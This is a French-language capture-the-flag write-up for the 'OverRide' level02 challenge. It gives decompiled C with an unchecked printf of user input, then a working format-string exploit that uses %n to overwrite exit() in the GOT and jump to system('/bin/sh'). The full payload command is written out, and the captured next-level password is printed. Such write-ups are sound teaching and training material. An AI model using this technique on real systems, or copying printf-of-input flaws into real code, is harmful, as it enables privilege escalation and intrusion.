# Level 02

Voici le code source decompile:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

int main(void)
{
    size_t content_size;
    size_t cspn_ret;
    char buff1[112];
    char buff2[48];
    char buff3[100];
    FILE *fp;

    bzero(buff1, 112);
    bzero(buff2, 48);
    bzero(buff3, 100);
    fp = (FILE *)NULL;
    fp = fopen("/home/users/level03/.pass", "r");
    if (fp == (FILE *)NULL)
    {
        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
        exit(1);
    }
    content_size = fread(buff2, 1, 41, fp);
    cspn_ret = strcspn(buff2, "\n");
    if (content_size != 41)
    {
        fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
        fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
        exit(1);
    }
    fclose(fp);
    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username: ");
    fgets(buff3, 100, stdin);
    cspn_ret = strcspn(buff3, "\n");
    buff3[cspn_ret] = '\0';
    printf("--[ Password: ");
    fgets(buff1, 100, stdin);
    cspn_ret = strcspn(buff1, "\n");
    buff1[cspn_ret] = '\0';
    puts("*****************************************");
    if (strncmp(buff2, buff1, 41) == 0)
    {
        printf("Greetings, %s!\n", buff3);
        system("/bin/sh");
        return 0;
    }
    printf(buff3);
    puts(" does not have access!");
    exit(1);
}
```

Pour cet exercise nous allons utiliser `printf()` avec `%n` pour ecraser l'adresse de `exit()` dans la `GOT` par l'adresse de `system('/bin/sh')` dans le code. Pour avoir l'adresse de `system('/bin/sh')` nous pouvons utiliser `objdump`:

```bash
level02@OverRide:~$ objdump -d ./level02
  400a85:       bf 32 0d 40 00          mov    $0x400d32,%edi
  400a8a:       e8 21 fc ff ff          callq  4006b0 <system@plt>
```

Ensuite nous allons trouver l'adresse de `exit()` dans la `GOT`:

```bash
objdump -R ./level02

./level02:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
00000000006011b8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601248 R_X86_64_COPY     stdin
0000000000601250 R_X86_64_COPY     stderr
00000000006011d8 R_X86_64_JUMP_SLOT  strncmp
00000000006011e0 R_X86_64_JUMP_SLOT  puts
00000000006011e8 R_X86_64_JUMP_SLOT  fread
00000000006011f0 R_X86_64_JUMP_SLOT  fclose
00000000006011f8 R_X86_64_JUMP_SLOT  system
0000000000601200 R_X86_64_JUMP_SLOT  printf
0000000000601208 R_X86_64_JUMP_SLOT  strcspn
0000000000601210 R_X86_64_JUMP_SLOT  __libc_start_main
0000000000601218 R_X86_64_JUMP_SLOT  fgets
0000000000601220 R_X86_64_JUMP_SLOT  fopen
0000000000601228 R_X86_64_JUMP_SLOT  exit
0000000000601230 R_X86_64_JUMP_SLOT  fwrite
```

Nous pouvons egalement voir qu'on a un binaire 64-bit. Ce qui fait que nous allons devoir aligner a la main les adresses dans notre payload. Nous pouvons voir que l'adresse de `exit()` ne fait que 6-octets. Nous allons donc devoir ajouter un padding de deux octets dans notre payload pour que l'adresse soit alignee sur 8-octets:

```bash
level02@OverRide:~$ (python -c 'print "%4196997d%30$n00" + "\x28\x12\x60"' ; python -c 'print "A"' ; cat) | ./level02
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
